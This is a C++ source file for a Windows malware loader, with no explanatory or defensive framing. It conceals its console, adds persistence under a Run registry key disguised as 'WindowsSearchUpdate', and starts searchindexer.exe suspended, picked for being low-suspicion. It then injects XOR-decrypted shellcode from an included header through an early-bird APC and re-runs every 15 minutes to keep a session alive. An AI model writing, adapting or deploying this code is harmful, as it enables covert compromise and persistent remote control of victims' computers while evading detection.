#include <windows.h>
#include <wininet.h>
#include "payload.h"

#pragma comment(lib, "wininet.lib")

bool IsNetworkReady() {
    // Check connection to a high-uptime server
    return InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
}

bool TryExecute() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    // Using 'searchindexer.exe' - a very common, low-suspicion process
    if (!CreateProcessA("C:\\Windows\\System32\\searchindexer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) return false;

    unsigned char* decrypted = new unsigned char[shellcodeLen];
    for (int i = 0; i < shellcodeLen; i++) {
        decrypted[i] = encryptedShellcode[i] ^ xorKey;
    }
    
    WriteProcessMemory(pi.hProcess, remoteMem, decrypted, shellcodeLen, NULL);

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);
    ResumeThread(pi.hThread);

    delete[] decrypted;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int main() {
    FreeConsole();
    
    // Persistence setup
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hkey = NULL;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    RegSetValueExA(hkey, "WindowsSearchUpdate", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hkey);

    while (true) {
        if (IsNetworkReady()) {
            if (TryExecute()) {
                // If successful, wait 15 minutes before checking if we need to revive the session
                // This prevents "session spam" while ensuring long-term connection
                Sleep(900000); 
            }
        }
        // If internet is down or execution failed, wait 60 seconds and retry
        Sleep(60000);
    }
    return 0;
}
